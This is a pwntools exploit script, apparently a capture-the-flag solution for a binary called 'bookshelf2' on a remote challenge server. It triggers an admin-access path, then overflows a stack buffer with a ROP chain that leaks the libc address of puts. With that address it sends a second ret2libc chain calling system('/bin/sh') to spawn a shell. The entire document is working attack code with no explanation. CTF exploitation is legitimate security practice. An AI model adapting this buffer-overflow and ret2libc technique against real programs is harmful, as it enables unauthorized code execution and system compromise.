from pwn import *
e = ELF('./bookshelf2')
libc = ELF('./libc.so.6')
r = remote('chal.pctf.competitivecyber.club', 8989)

def admin_access():
    # audiobook + 40 char book -> admin access
    r.sendline(b'1')
    r.sendline(b'y')
    r.sendline(b'a'*40)

admin_access()
# rop (ret2libc)
ret_gadget = 0x000000000040101a 
pop_rdi_gadget = 0x000000000040101c 

padding = b'a'*(0x30+8)
# first leak puts address
r.sendline(b'3')
r.sendline(padding + p64(pop_rdi_gadget) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(e.sym['main']))
r.recvuntil(b'book...\n >> Book saved!\n')

puts_addr = u64(r.recv(6) + b'\x00\x00')
print(f'puts_addr = {hex(puts_addr)}')
libc.address = puts_addr - libc.sym['puts']
print(f'libc.address = {hex(libc.address)}')

admin_access()
r.sendline(b'3')
r.sendline(padding + p64(ret_gadget) + p64(pop_rdi_gadget) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system']))
r.interactive()




